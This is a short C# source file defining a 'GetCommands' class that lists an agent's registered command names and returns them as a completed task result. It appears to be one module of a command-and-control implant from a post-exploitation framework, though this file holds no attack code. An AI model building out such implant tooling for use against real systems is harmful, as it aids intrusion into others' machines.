using DynamicEngLoading;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class GetCommands : EngineerCommand   
    {
        public override string Name => "GetCommands";
        public override async Task Execute(EngineerTask task)
        {
            StringBuilder output =  new StringBuilder();
            foreach (var command in Program._commands)
            {
                output.AppendLine(command.Name);
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);
        }
    }
}
